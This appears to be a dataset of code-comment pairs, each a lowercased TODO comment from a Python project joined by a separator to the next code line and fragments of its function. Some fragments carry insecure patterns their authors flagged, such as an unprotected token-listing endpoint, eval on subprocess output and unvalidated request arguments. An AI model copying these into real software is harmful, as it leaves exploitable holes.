# todo: if empty, add 'pass' </s> except:	transform if self.ast[-1] == RETURN_NONE: self.ast.pop()  # remove last node pass maybe_show_tree(self, self.ast)
# @todo: handle lama correctly </s> if not memory_type:	Critic state_shape = (state_shape, ) if len(state_shape) in [1, 2]: state_size = reduce(lambda x, y: x * y, state_shape) else:
ndpi = (96, 96) # todo: read real dpi </s> debug_out("input dpi = %d x %d"%ndpi, verbose)	convert debug_out("input dpi (forced) = %d x %d"%ndpi, verbose) else: if colorspace: color = colorspace
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_comparison def test_comparison(self):
# todo: this should not be hard coded </s> result.headers[b'content-type'] += '; profile=/schema/root'	root manager.config = json.loads(request.data) result = jsonify(manager.config) return result
# todo: write tests </s> from any tag with @meter.count and @meter.unit attributes, make a :class:`timesignature`.	_timeSigFromAttrs def _timeSigFromAttrs(elem): :param :class:`~xml.etree.ElementTree.Element` elem: An :class:`Element` with @meter.count and @meter.unit attributes.
return deserialize(self.binary, from_bytes=true)  # todo: techdebt fix </s> @object.setter	BinObject @property def object(self) -> Any: def object(self, value: Any) -> None: self.binary = serialize(value, to_bytes=True)  # TODO: techdebt fix
# todo: cache this value. same value should be used for future tests in this policy or other policies when handling this request </s> args[index] = self.pip.get_attribute_value(path[1], path[2])	evaluate_function except KeyError: try: except KeyError: _log.debug("PolicyDecisionPoint: Attribute not found: %s %s" % (path[1], path[2]))
# todo: test 1: quando para a data no estado só tem a planilha de total, </s> if date in cases:	get_state_data_from_db for spreadsheet in spreadsheets: date = spreadsheet.date continue
# todo: is this right? </s> if self.endian == ">":	checksum elif self.algorithm == "sha1": digest = hashlib.sha1(data).digest() (a, b, c, d, e) = struct.unpack("<LLLLL", digest) digest          = struct.pack(">LLLLL", a, b, c, d, e)
# todo allow multiple barriers to be executed </s> self._store_proxy.wait_until('barrier', 0)	barrier def barrier(self):
# todo: retry our one ping. we should not have to retry. </s> for _ in range(timeout):	one_ipv6_ping def one_ipv6_ping(self, host, dst, timeout=2): self.require_host_learned(host) ping_result = host.cmd('ping6 -c1 %s' % dst) if re.search(self.ONE_GOOD_PING, ping_result):
# todo you should put some extra protection on this, so a user can only </s> return jsonify(get_stored_tokens()), 200	list_tokens @app.route('/auth/tokens', methods=['GET']) def list_tokens():
# todo (a8): add user to models </s> setattr(result, 'user', none)	obj_get result.branch = result.revision.branch setattr(result, 'result', result) return result
# todo(b/207464757): tf compilation is disabled </s> self.assertequal(f_tf_graph_nr_consts, 1)	test_shared_constants_under_jit return g_jit(x) + const + const f_tf_graph_nr_consts = self.CountLargeTfConstants(jax2tf.convert(f), const)
# todo(b/141131288): enable complex-valued sorts on tpu. </s> if (onp.issubdtype(dtype, onp.complexfloating) and (	testSortNumKeys for num_keys in range(1, shape[0] + 1))) def testSortNumKeys(self, shape, dtype, num_keys): (jtu.device_under_test() == "cpu" and jax.lib.version <= (0, 1, 47)) or jtu.device_under_test() == "tpu")):
# todo: check utf-8 </s> return read_bytes_exactly(fasl_string, pos, sym_len)	read_fasl_string sym_len, pos = read_fasl_integer(fasl_string, pos)
# todo: rename style -> parser </s> editor.setparser(pyzo.config.settings.defaultstyle)	createEditor editor.setParser(parser) else: return editor else:
#todo: make more straightforward (somehow) </s> display_apps = []	get_display_apps def get_display_apps( trans, hda ): def get_display_app_url( display_app_link, hda, trans ): web_url_for = routes.URLGenerator( trans.webapp.mapper, trans.environ )
# todo: remove linear scale to exponential scale </s> if progress > 1:	progress_to_color color_range = COLOR16_RANGE if p_safe else COLOR256_RANGE progress = get_progress() return color_range[-1] else:
# todo: support this instead of failing. </s> with self.assertraises(notimplementederror):	test_add_hotkey_single_step_fail_invalid_combination def test_add_hotkey_single_step_fail_invalid_combination(self): keyboard.add_hotkey('a+b', lambda e: None, True)
raise notimplementederror # todo </s> def latest_offset(self):	latest_offset
# todo: drop non-callable keys in dramatiq v2. </s> key_list = keys() if callable(keys) else keys	incr_and_sum if value > maximum: return False mapping = client.get_multi(key_list) total = amount + sum(mapping.values())
# todo: make not hardcoded </s> logfile = codecs.open(	handle_error 'always' ) os.path.join(self.config.logdir, 'exceptions.log'), 'a',
# todo: log exception </s> pass	scan result['import_hash'] = pe.get_imphash() except Exception as e: if hasattr(pe, 'DIRECTORY_ENTRY_RESOURCE'): result['resource_data'] = _dump_resource_data("ROOT",
# todo move to common? </s> def _sanitize(p: path) -> str:	_sanitize return re.sub(r'\W', '_', str(p))
# todo add ruby personality. </s> return po2yaml(inputfile, outputfile, templatefile, includefuzzy,	run_converter def run_converter(inputfile, outputfile, templatefile, includefuzzy=False, outputthreshold=None): outputthreshold).run()
#todo same issue with batch_size </s> if len(self.inputs) == 0:	channels def channels(self): raise ValidationException("gan.channels() requested but no inputs provided") return self.ops.shape(self.inputs[0])[-1]
# todo: this is just for compatibility with </s> 'items': activities,	get 'itemsPerPage': len(activities), 'totalResults': total_results, 'filtered': False, 'sorted': False,
# todo: don't resize image but change create_tiles. </s> image = np.reshape(image, (image.shape[0], image.shape[1], 1))	create_bitmap transform=raster_dataset.transform) save_image(cache_file, bimtap_image, raster_dataset) image[image == 255] = 1 return image
# todo: needs input cleansing and validation </s> try:	create_policy Character control endpoint for creating a policy and making arrangements with Ursulas. bob_pubkey = bytes.fromhex(request.args['bob_encrypting_key']) label = bytes.fromhex(request.args['label'])
# todo: i don't think we need these here because likes of to_parent </s> handler = self._to_bytes_handlers[cls]	to_bytes if value is None: return None retval = handler(cls, value, *args, **kwargs)
# todo: no unit tests cover any of this. </s> @staticmethod	pre_recursion def pre_recursion(desc): if 'animations' in desc:
# todo: breaklines should be displayed correctly </s> content = "  " + re.sub('<[^<]+?>', '', toot['content'])	home clean = re.sub('<[^<]+?>', '', toot['reblog']['content']) content = username + display_name + clean print(content + "\n")
# todo: maybe we should do this in a thread </s> backup_database()	save from freenasUI.common.system import backup_database try: except: pass
# todo return somethign useful ;) </s> return kgemodel(config, dataset)	KgeModel raise NotImplementedError def create(config, dataset): pass
# todo: use more broadly numpy </s> full_data = list(np.array(self.lastchanneldata) - np.array(delta))	parse18bit deltas = decompressDeltas18Bit(packet[:-1]) for delta in deltas: sample = OpenBCISample(sample_id, full_data, self.lastAcceleromoter) self.samples.append(sample)
# todo: maybe check if we are inside a classic snap and don't do </s> busctl = shutil.which("busctl")	command_apply def command_apply(run_generate=True, sync=False, exit_on_error=True):  # pragma: nocover (covered in autopkgtest) if "SNAP" in os.environ: if busctl is None: raise RuntimeError("missing busctl utility")
return  # todo: update </s> elif item == 'user_payment_id':	get_user_info return user.address  # TODO: update elif item == 'user_paid': return  # TODO: update elif item == 'user_payment_amount':
# todo: should wait for the end of the ongoing test case, and stop gracefully netmon and procmon </s> try:	server_init self.total_mutant_index  = 0 self.total_num_mutations = self.num_mutations() import signal self.signal_module = True
# todo: fix this, this is one of the few cases where using the config </s> self.standalone = self.config.get('standalone', false)	Job default='DEBUG') self.__logging_handlers = {} if self.config.get('run.dry_run.enabled'):  # Modify args for dry-run unique_id = self.config.get('run.unique_job_id')
# todo remove </s> slug = self.kwargs['slug'] if 'slug' in self.kwargs else ''	dispatch def dispatch(self, request, *args, **kwargs): if slug: obj = super(ArticleDetailView, self).get_object()
# todo: replace suite with testcases </s> testcases_folder_path = testcases_folder_path or os.path.join(os.getcwd(), "suite")	load_testcases_folder } testcases_definition_mapping = {} testcases_items_mapping = load_folder_content(testcases_folder_path) for testcase_file_path, testcase_items in testcases_items_mapping.items():
# todo: implement this </s> return self.usages	_get_usages self.usages = map(eval, self._chained.stderr.readline().split())
# todo: investigate why this happens </s> val = '--'	validate_args if val is not None: if type(val) is list: setattr(args, opt, val.split(',')) if args.file == '-': args.file = stdin
# todo: remove this when domain decomposition is merged </s> warnings.warn('this feature is not yet implemented in a release ' \	set_dd_allow_leakage def set_dd_allow_leakage(self, allow): 'version of openmc') if not type(allow) == bool:
# todo: wobble </s> spin = rot_z(t.gast * tau / 24.0)	ITRF_to_GCRS2 def ITRF_to_GCRS2(t, rITRF, vITRF): position = einsum('ij...,j...->i...', spin, array(rITRF)) position = einsum('ij...,j...->i...', t.MT, position)
# todo: this check is to maintain backwards compatibility with the old way of creating </s> if hasattr(self, 'package_form'):	new vars = {'data': data, 'errors': errors, 'error_summary': error_summary} self._setup_template_variables(context, {'id': id}) c.form = render(self.package_form, extra_vars=vars) else:
# todo(blk-u): shouldn't need to clear the registry here, but some </s> dependency.reset()	load_backends def load_backends(self): for manager in [assignment, catalog, credential, ec2, identity, policy, token, token_provider, trust]:
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_comparison def test_comparison(self):
# todo: process </s> result = content.update(units, options)	update_units content = Agent.Content()
# todo: handle a possible deadlock more gracefully. </s> thread_a.join()	test_hl_neg thread_c.sleeptime = 1 thread_a.start() thread_b.join() thread_c.join()
"""todo: not implemented""" </s> notimplementederror("prs welcome")	percent_rank @symbolic_dispatch def percent_rank(x):
# todo add locales </s> raise yunohosterror("bad_value_type", value_type=type(ttl))	domain_setting ttl = int(value) except: if ttl < 0: raise YunohostError("must_be_positive", value_type=type(ttl))
# todo: this never checks in case one of the operations fails </s> def download_if_missing(dirname="training-f", filename="training.zip",	download_if_missing url="https://www.physionet.org/physiobank/database/challenge/2016/training.zip",tar=False): if not os.path.isdir(dirname):
# todo: check rootfs fs against parameter injection </s> fs.create("/sbin/save", """	sync tar xf /current_directory.tar rm /current_directory.tar cd {dest} tar cf /root.tar *
# todo: probabilistic with each route </s> add.append(e('route', id='route%s' % edge, edges=' '.join(route)))	generate_cfg 'http://sumo.dlr.de/xsd/additional_file.xsd') for (edge, route) in self.rts.items(): num_traffic_lights = len(list(traffic_lights.get_properties().keys())) if num_traffic_lights > 0:
# todo: must be the same if we merged/pushed before, if not -- skip </s> pblshd = ds.repo.copy_to(files=paths,	_publish_dataset lgr.debug("Invoking copy --auto") annex_copy_options += ' --auto' remote=remote, options=annex_copy_options)
#todo verify input </s> path = request.args.get('paste')	remove_tag @Tags.route("/Tags/remove_tag") def remove_tag(): tag = request.args.get('tag') r_serv_metadata.srem('tag:'+path, tag)
# todo: give a vanilla example </s> .. math::	feca def feca(predicted_power, df_appliances_ground_truth): fraction = \\sum_n min \\left (
# todo operators </s> properties.unregister()	unregister texture_nodes.unregister() volume_nodes.unregister() ui.unregister()
common_path=prefix,  # todo: add key? </s> action="local",	make_inline_attachments_decision ld = local_diff[k] md = MergeDecision( conflict=False, local_diff=[ld],
# todo: check rootfs fs against parameter injection </s> ext2_write_to_file(rootfs, "/sbin/save",	add_local_files if not is_ext2(rootfs): return "cd /root\ntar cf /root.tar *\nsync\n") print("[+] Adding current directory to the filesystem..")
# todo: add logging </s> pass	Bot self.channel_cooldowns[msg.channel.id] = time.time() except SyntaxError:
# todo this makes self variables non-breakable. wanted? </s> if isinstance(name, er.instanceelement) \	_process if details and details[0][1] != '=': no_break_scope = True and not name.is_class_var: no_break_scope = True
# todo: for now, circumnavigate the detached head issue. </s> for subds in source.get_dataset_handles(recursive=true):	test_publish_with_data def test_publish_with_data(origin, src_path, dst_path): source = install(path=src_path, source=origin, recursive=True) AnnexRepo(opj(src_path, subds), init=True, create=False).git_checkout("master") source.repo.get('test-annex.dat')
# todo make this cancellable with is_cancellable_behavior </s> @connection.on_connection_thread()	BehaviorComponent drive_on_charger_request = protocol.DriveOnChargerRequest() return await self.grpc_interface.DriveOnCharger(drive_on_charger_request) async def find_faces(self) -> protocol.FindFacesResponse: Turn in place and move head to look for faces
# todo: make treecount configurable via an inputslot </s> self._tree_count = 10	__init__ self.progressSignal = OrderedSignal() self._forest_count = 10
# todo: error handling and such </s> res = response.json()	_response def _response(self, response): if res.get('Success', False): return True
# todo: conflict detection/resolution </s> for key in a:	_get_mappings mappings.update(mapping.to_dict()) a = mapping._collect_analysis() analysis.setdefault(key, {}).update(a[key]) return mappings, analysis
# todo - add tinfo when available </s> raise conaninvalidconfiguration("tinfo is not (yet) available on cci")	validate raise ConanInvalidConfiguration("Windows is not supported by libedit (missing termios.h)") if self.options.terminal_db == "tinfo":
# todo(boris-42): make it work through assertisinstance </s> self.assertequal(str(type(p_inst)), str(p))	test_get_provider p_inst = vm_provider.VMProviderFactory.get_provider(p.__name__, None)
# todo: gae: support parents via gaekeyfield </s> assert value.parent() is none, "parents are not yet supported!"	convert_value_from_db value = value.decode('utf-8') elif isinstance(value, Key): if db_type == 'integer': if value.id() == None:
# todo: is there a check we can do to ensure that we've matched the </s> closes.values[indexer] = special_closes.values	_overwrite_special_closes return indexer = opens.searchsorted(special_closes) - 1
# todo: checking that hour/minute/second are not </s> self._assign_hms(res, value_repr, hms)	_parse_numeric_token (i, hms) = self._parse_hms(idx, tokens, info, hms_idx) if hms is not None: elif idx + 2 < len_l and tokens[idx + 1] == ':': res.hour = int(value)
# todo html </s> print(self.get_display_name(context), file=file)	output_header def output_header(self, file, context):
# todo(mvandijk): enable cluster security once trove features are in </s> store_key_mock.assert_called_once_with('key')	test_configure_cluster_security self.manager.app._configure_cluster_security('key')
pass  # todo </s> def test_wallet_address_import_public_key_segwit(self):	test_wallet_address_import_public_key_segwit
# todo: async </s> self.session.remove_handler(self)	on_connection_close self.session.stop_heartbeat()
# todo: devise a way so we don't need to "always trust". </s> return super(gpgwrapper, self).decrypt(data,	decrypt def decrypt(self, data, always_trust=True, passphrase=None): Decrypt data using GPG. always_trust=always_trust, passphrase=passphrase)
# todo: expand to full set of info </s> def create_workflows_table(meta):	create_workflows_table return Table( 'workflows', meta,
# todo log. </s> return	_visit encoding = 'base64' else: pw = pwd.getpwuid(s.st_uid) gr = grp.getgrgid(s.st_gid)
# todo: provide a kernel which will describe how coordinates are extruded. </s> mesh = firedrake.extrudedmesh(m, layers, layer_height=0.1)	integrate_assemble_p0 m = UnitSquareMesh(2 ** power, 2 ** power) layers = 11 fs = firedrake.FunctionSpace(mesh, family, degree, name="fs") f = firedrake.Function(fs)
date_format = "aman"  ## todo: fix this </s> date_format = str(date_format).replace(	get_results_csv result_id = [] date_from_db = scan_id_temp[0].date "-", "_").replace(":", "_").replace(" ", "_") filename = "report-" + date_format + "".join(
# todo: it would be good to be able to notify an external </s> ofmsgs.extend(self.host_manager.learn_host_on_vlan_port(	_learn_host self.logger.info( 'host learned via stack port to %s', edge_dp.name) learn_port, pkt_meta.vlan, pkt_meta.eth_src)) for route_manager in (
## todo: impala attempt to speed up final pass after lstm. </s> state_values = out["state_values"]	get_state_values_logits_probabilities_log_probs nn_output = nn_output["output"] out = self.action_adapter.get_logits_probabilities_log_probs(nn_output) logits = out["logits"] probs = out["probabilities"]
# todo - remove the line below and use repo_url as your foundation </s> package.repo_url = _get_sourceforge_repo_url(sf_package_data)	fetch_metadata package.repo_watchers = len(sf_package_data.get('maintainers', [])) + len(sf_package_data.get('developers', [])) package.repo_description = sf_package_data.get('description', '') package.repo_forks = None package.participants = _get_sourceforge_participants(sf_package_data)
# todo: this is untested. </s> _raise_current_error()	set_client_ca_list name_stack = _lib.sk_X509_NAME_new_null() if name_stack == _ffi.NULL: try: for ca_name in certificate_authorities:
# todo: test filter functionality more </s> f = multistagechannelfilter(input_rate=8000, output_rate=20000, cutoff_freq=8000, transition_width=5000)	test_interpolating def test_interpolating(self): self.__run(f, 4000, 20000/8000)
'license': none, # todo </s> },	subscription_put response = utils.request.delete(SUBSCRIPTION_SERVER, json_data={ ) else:
# todo lib </s> self._items_renamed = [(proxies[uuid], blender_items[uuid][0].name) for uuid in renamed_uuids]	BpyDataCollectionDiff self._items_added = [(blender_items[uuid][0], blender_items[uuid][1]) for uuid in added_uuids] self._items_removed = [proxies[uuid] for uuid in removed_uuids] def empty(self): return not (self._items_added or self._items_removed or self._items_renamed)
pass # todo: explain </s> pass	status402 def status402(self):        # Payment Required
# todo: remove when #980 has been merged </s> info['url'] = formats[-1]['url']	_real_extract 'user_agent': 'QuickTime compatible (youtube-dl)', } info['ext'] = formats[-1]['ext'] playlist.append(info)
# todo: remove parametrized workaround once collection structure contains parametrization. </s> if x.name == name or x.name.split("[")[0] == name:	matchnodes has_matched = False for x in rep.result: resultnodes.extend(self.matchnodes([x], nextnames)) has_matched = True
# todo: remove this line when issue #2062 is fixed </s> return x + y	my_plan y = (x - 2) * 10
# todo: figure out why not working </s> utils.skip_under_xvfb()             # skip late so we smoke test the code	test_aperture grating.setColor('black') grating.draw() utils.compareScreenshot('aperture1_%s.png' %(self.contextName), win)
# todo check </s> return self.mimetype	format @interfacedoc def format(self):
# todo: remove when 3.8 with https://github.com/getpelican/pelican/pull/2256 </s> if pelican371_default_lang_patch:	extract_document_language def extract_document_language(document): language = settings['DEFAULT_LANG'] else:
#todo: make sure that the body is actually json. </s> return body	create_tenant return "whatever, we don't have XML yet" else: return 'it did NOT work\n'
# todo: use error page with message and redirect </s> return httpresponse("something wrong! tokens do not match...")	twitter_login_done if token.key != request.GET.get('oauth_token', 'no-token'): del request.session['request_token'] twitter = oauthtwitter.OAuthApi(settings.TWITTER_CONSUMER_KEY, settings.TWITTER_CONSUMER_SECRET, token) access_token = twitter.getAccessToken()
# todo unordered float </s> e = []	comisd def comisd(ir, instr, a, b): a = m2_expr.ExprOp('int_64_to_double', a[:64]) b = m2_expr.ExprOp('int_64_to_double', b[:64])
"meta.deleted": false,  # todo(tsileo): retrieve deleted and expose tombstone </s> "type": {"$in": [activitytype.create.value, activitytype.announce.value]},	nodeinfo q = { "box": Box.OUTBOX.value, } response = json.dumps(
pass # todo </s> def handle_request(self, input):	handle_request
# todo xxx postremora: uncomment when remora goes away </s> def test_confirm_resend(self):	TestRegistration self.user_profile.confirmationcode = "code" self.user_profile.save() url = reverse('users.confirm.resend', args=[self.user.id]) r = self.client.get(url, follow=True)
# todo (aron): add i18n by varying the language of the topic tree here </s> topictree = get_flat_topic_tree()	_add_full_title_from_topic_tree @classmethod def _add_full_title_from_topic_tree(cls, entry): video_title_dict = cls._construct_video_dict() entry_kind = entry['entity_kind']
# todo: fix circular import </s> from website.addons.badges.util import get_sorted_user_badges	_profile_view def _profile_view(uid=None): user = get_current_user() profile = User.load(uid) if uid else user
# todo test errors </s> assert_array_equal(expect, actual)	test_advanced_indexing_1d_bool actual = z[ix]
# todo: find a better random value </s> return datetime.datetime.now()	_auto_value def _auto_value(self, prop): if prop.type == datetime.datetime: elif prop.type == datetime.date: return datetime.date.today()
# todo deprecate </s> this method creates and assesses the accuracy of a logistic regression	random_forest def random_forest(self, cores=4, trees=200, tune=False, debug=False): model. Parameters
# todo: fixed by using realpath, but there should be a cleaner </s> assert_equal(	_test_AnnexDB db.save() db2 = cls(annex=annex) set(db2.get_obsolete()), {opj(realpath(path), p) for p in ['file1.txt', filep2, '2git']})
# todo: deal with any overwrite issues </s> if len(self.tuple_cache) == 0:	_save_tuples def _save_tuples(self, filepath=None): crypten.log("Tuple cache not saved - cache is empty") return
# todo: this logic below was borrowed from `dataframe.pandas_df` to set the index </s> import pandas as pd	rename_output def rename_output(pdf): if len(index_columns) > 0: append = False
# todo: check if contact is cached (same contact as </s> contact_response = ''	_get_contact dt_format=None): Experimental if nir == 'jpnic': form_data = None
# todo: do we change this to something like "threshold" </s> m, n = int(request.args['m']), int(request.args['n'])	create_policy bob_pubkey = bytes.fromhex(request.args['bob_encrypting_key']) label = bytes.fromhex(request.args['label']) payment_details = request.args['payment'] federated_only = True # const for now
# todo: common crud method </s> user = await self.middleware.call('datastore.query', 'account.bsdusers', [('id', '=', pk)], {'prefix': 'bsdusr_'})	UserService ) async def do_update(self, pk, data): if not user: raise ValidationError(None, f'User {pk} does not exist', errno.ENOENT)
# todo: parse output and check if succeeded </s> for line in output.stdout.splitlines():	_CallHotplugCommand def _CallHotplugCommand(self, name, cmd): output = self._CallMonitorCommand(name, cmd) logging.info("%s", line)
# todo: replace with remoteunixcommand </s> cmd = command(self.ssh_command,	SshBackupExecutor :param CheckStrategy check_strategy: the strategy for the management of the results of the various checks self.ssh_options, path=self.server.path)
# todo do this abstractly </s> if f.name == 'player_relative':	n_channels_type else: num_channels += 1 cat_channels_in -= 1 return cat_channels_in, cat_channels_out, num_channels
self.req.setoption("timeout", 60)  #@todo: remove in 0.4.10 </s> self.setup_base()	_setup self.req     = self.pyload.requestFactory.getRequest(self.classname) self.premium = False self.grab_info() self.setup()
# todo: if mainchare constructor is *always* going to be threaded, we can remove the second condition </s> if self.buildingmainchare and threads.get_ident() != self.threadmgr.main_thread_id:	recvGroupMsg em.addRecvTime(time.time() - t0) em.startMeasuringTime() em.run_non_threaded(obj, header, args)  # now call the user's __init__ else:
# todo: deprecate </s> self.evaluation_loop.on_evaluation_start()	run_evaluation if self.evaluation_loop.should_skip_evaluation(dataloaders, max_batches): return [], [] eval_results = self._evaluate(self.model, dataloaders, max_batches, test_mode) eval_loop_results = self.__log_evaluation_epoch_metrics(eval_results, test_mode)
# todo(jd) move into prepare_service gettextutils and eventlet? </s> eventlet.monkey_patch()	agent_compute def agent_compute(): gettextutils.install('ceilometer') service.prepare_service(sys.argv)
# todo: handler_node.name and handler_node.type </s> handler_exits |= self.add_body_arcs(handler_node.body, from_line=handler_start)	try_work for handler_node in handlers: handler_start = self.line_for_node(handler_node) exits |= handler_exits if finalbody:
# todo: renable when tagging is removed from the analysis report. </s> self.assertequal(tag.labels, expected_labels)	testExamineEventAndCompileReport expected_labels = [u'nsrl_present']
# todo: move the inside snippets to the corresponding snippets dict </s> if '()' in value:	make_template colon = '' property_ = align_prefix(args['property-name'], not disable_prefixes) if value.replace('()', '') in ['rotate','rotateX','rotateY','rotateZ','skew','skewX','skewY']: value = value.replace('()', '($1${1/^((?!0$)-?(\d*.)?\d+)?.*$/(?1:deg)/m})')
#todo: let's not use the solitude transaction id if we can help it. </s> try:	prepare_refund Prepare a JWT to pass into navigator.pay() for a specific transaction. to_refund = Contribution.objects.get(user=request.amo_user, solitude_transaction_id=uuid,
# todo: give a vanilla example </s> .. math::	tp_fp_fn_tn def tp_fp_fn_tn(predicted_states, ground_truth_states): TP^{(n)} = \\sum_{t}
# todo: this is wrong. globe.semiminor_axis does </s> [-20038296.88254529, 20038296.88254529], decimal=6)	test_ellipsoid_polar_transform [-20038296.88254529, 20038296.88254529], decimal=6) assert_almost_equal(np.array(aeqd.y_limits), result = aeqd.transform_point(5.0, 80.0, geodetic) assert_array_almost_equal(result, [1078828.3, 289071.2], decimal=1)
# todo: update consumer </s> return	bind except DuplicateKeyError:
# todo: explicitly exploit symmetry and set onesided=true </s> a_fft = torch.rfft(a, signal_ndim=1, onesided=false)	circular_correlation :param b: torch.tensor, shape: (batch_size, dim) :return: torch.tensor, shape: (batch_size, dim) b_fft = torch.rfft(b, signal_ndim=1, onesided=False) a_fft[:, :, 1] *= -1
# todo: use the dbobject instance instead of it's qualified_name </s> current_nondefault_objects = dbcontext.get_role_current_nondefaults(rolename, object_kind, access)	__init__ self.default_acl_possible = self.object_kind in OBJECTS_WITH_DEFAULTS self.current_defaults = dbcontext.get_role_current_defaults(rolename, object_kind, access) if current_nondefault_objects: self.current_nondefaults = set([(dbo.qualified_name, priv) for dbo, priv in current_nondefault_objects])
# todo implement .!{cmd} (ex shell out) test for windows and osx </s> @unittest.skipif(sublime.platform() == 'windows' or sublime.platform() == "osx", 'test only works in linux')	test_simple_filter_through_shell def test_simple_filter_through_shell(self): self.write("two words\nbbb\nccc")
# todo(sirp): should this be a dict, or a list of dicts? </s> metadata = dict((m.key, m.value) for m in image.metadata	_make_image_dict file_attrs = base_attrs | set(['location', 'size']) files = [_fetch_attrs(f, file_attrs) for f in image.files] if not m.deleted) image_attrs = base_attrs | set(['name', 'image_type', 'state', 'public'])
svg = apply_template(svg, {"maxpoints":maxpoints, "trdn": trdn, "msg":"", "valuemid":"0.5", "timemid":"10s", "datapoints":"","init_max_y": "false", "max_y": 0, "seconds_scale":0, "y_shift": 0, "zero": 0, "l_y":""}) # todo templating engine </s> else:	plotwh print "GENERATE_ERROR" traceback.print_exc() svg = apply_template(svg, {"MAXPOINTS":MAXPOINTS, "TRDN": trdn, "MSG":"", "VALUEMID":"0.5", "TIMEMID":"10s", "DATAPOINTS":"","INIT_MAX_Y": "false", "MAX_Y": 0, "SECONDS_SCALE":0, "Y_SHIFT": 0, "ZERO": 0, "L_Y":""}) # TODO templating engine if width and height: svg = svg.replace('height="210" width="610"', 'height="%s" width="%s"' % (height, width)) # TODO: switch to templating
# todo(pfnet): implement crop function </s> h = upscore8	__call__ h = self.upscore8(fuse_pool3) upscore8 = h  # 1/1 for axis in [2, 3]: start = 31
# todo(b/80125832): enable nccl in tests </s> params = base_params._replace(all_reduce_spec='pscpu')	test_grad_aggregation params = base_params._replace(num_gpus=8, hierarchical_copy=True) self._test_grad_aggregation(params, 10) self._test_grad_aggregation(params, 10) params = base_params._replace(num_gpus=8,
# todo - add some tests to this response </s> response = self.do_list(	test_list } ) { 'item': 100000,
# todo(erikbern): should compute jacobian of this one </s> def f(x):	f c, lambd, k = x neg_LL = 0
# todo add description field to the model </s> group = trans.app.model.group( name=name )	create if self.get( trans, name=name ): raise Conflict( 'Group with the given name already exists. Name: ' + str( name ) ) trans.sa_session.add( group ) trans.sa_session.flush()
# todo multi-level import non-breakable </s> if isinstance(par, pr.import) and len(par.namespace) > 1:	_process result.append(par) else: no_break_scope = True result.append(par)
# todo(ytknzw): add more specific assertion with the test case. </s> assert figure.has_data() is true	test_plot_contour assert figure.has_data() is False elif len(params) == 2: else: assert figure.has_data() is True
# todo there are more rules for adjusting rx, ry </s> self.startpath()	Rect rx = _PreferNonZero(rx, ry) ry = _PreferNonZero(ry, rx) self.M(x + rx, y) self.H(x + w -rx)
# todo check output </s> output = self.openio('object delete ' + self.container_name +	_test_obj self.openio('object show ' + self.CONTAINER_NAME + ' ' + obj_name) ' ' + obj_name) self.assertEqual(0, len(output))
# todo: support media types </s> if rule.type == 'qualified-rule':	find_stylesheets_rules tree, stylesheet, css_url.geturl()): yield rule yield rule
# todo xxx graalvm change </s> raise unittest.skiptest("missing threading support")	test_server_accept remote.send(remote.recv(4)) t = threading.Thread(target=serve) t.start() evt.wait()
# todo: create unsupportedproviderexception. (?) </s> raise exception("this provider is not supported: {p}".format(p=cli_context.obj['provider']))	start start_ec2(cluster_name=cluster_name, region=ec2_region) else:
# todo: implement this. </s> yield none	middlewares_from_config @inlineCallbacks def middlewares_from_config(config): returnValue([])
# todo(b/163904067): mimic defun' behavior and reset the step seed to </s> resetstepseed()	If @tf.function(autograph=False) def ElseBranch(*args): inp = Pack(inputs, args) out = else_branch(inp)
# todo(mottodora): find better way to ignore non connected </s> z = functions.where(cond, z,	update cond = w_adj.array.astype(numpy.bool) cond = numpy.broadcast_to(cond, z.array.shape) numpy.broadcast_to(numpy.array(-10000), z.array.shape)
# todo: fix maximum size limit handling to create new stream. </s> data_stream.writefinalize()	SerializedDataStreamTest data_stream.WriteInitialize() data_stream.WriteEntry(b'test_entry_data') with self.assertRaises(IOError): data_stream.WriteEntry(b'test_entry_data')
# todo: remove "get_" from the name </s> return the type of the node	get_node_type def get_node_type(self, node, index=False): Args: node: The node ID from the original graph
raise notimplementederror  # todo ... </s> :rtype: tf.tensor	string_replace :return: (batch,), string
# todo: how do i make the __iter__ thread safe? </s> cursor = self._conn.execute('select information from data')	__iter__ def __iter__(self): for r in cursor: obj = cPickle.loads(r[0])
system_info = none #todo </s> new_info_file = recordinginfofile.create_empty_file(rec_dir)	_recording_update_legacy_from_v1_15_to_pprf_2_0 recording_software_version = None  # TODO recording_name = None  # TODO new_info_file.recording_uuid = recording_uuid new_info_file.start_time_system_s = start_time_system_s
# todo: expose more of the connection create parameters (instead of </s> self.sendhcicommand(0x200d, '\x60\x00\x30\x00\x00' + p8(addr_type) + bt_addr[::-1] + '\x01\x18\x00\x28\x00\x00\x00\xd0\x07\x00\x00\x00\x00')	connectToRemoteLEDevice addr_type: Public Device (0x00), Random Device (0x01), Public Identity (0x02), Random static Identity (0x03).
# todo: 3.5 does not maintain order but it should be deprecated soon </s> assert r[1]['steps'] == [{'message': 'test two step', 'screenshot': none, 'error': none}]	test_multi_function_success assert r[1]['set_name'] == ''
# todo: raise warning if computed output is already in cache. </s> cache.update(zip(step.outputs, listify(output_data)))	predict else: raise TypeError('{} does not implement predict or transform!'.format(step.name)) output_data = [cache[o] for o in self.outputs] if len(output_data) == 1:
# todo: remove warning check once deprecated </s> hits = list(self.df.sindex.intersection((2.5, 2.5, 4, 4), objects=true))	test_sindex assert self.df.sindex.size == 5 with pytest.warns(FutureWarning, match="`objects` is deprecated"): assert len(hits) == 2 assert hits[0].object == 3
# todo: process form submission </s> return render_template("admin_add_user.html")	admin_add_user @app.route('/admin/add', methods=('GET', 'POST')) def admin_add_user():
## todo: # fixme: remove me </s> if not paste_childrens:	get_all_pastes_domain paste_parent = father.replace(self.paste_directory, '')[1:] paste_childrens = self.r_serv_metadata.smembers('paste_children:{}'.format(paste_parent)) paste_childrens = self.r_serv_metadata.smembers('paste_children:{}'.format(father)) for children in paste_childrens:
#todo - uncomment if read/write and zero init sections can be moved into a separate flash algo section </s> assert error == false	callFunction logging.error("PC should be 0x%x but is 0x%x" % (expected_pc, final_pc)) error = True self.target.setVectorCatchFault(vector_catch_enabled) self.target.setVectorCatchReset(reset_catch_enabled)
# todo debug </s> print ("sensor rule element with "	_evaluateRuleElementsRecursively + "triggered. Set 'and' rule " + "also to not triggered.") + "remote id '%d' and username '%s' not " % (element.element.remoteSensorId,
# todo: figure out why </s> if graph.out_degree[node_] == 0:	_create_ui_graph if node is not None: g.add_node(node) g.add_edge(node, source_node) for src_, dst_ in graph.edges:
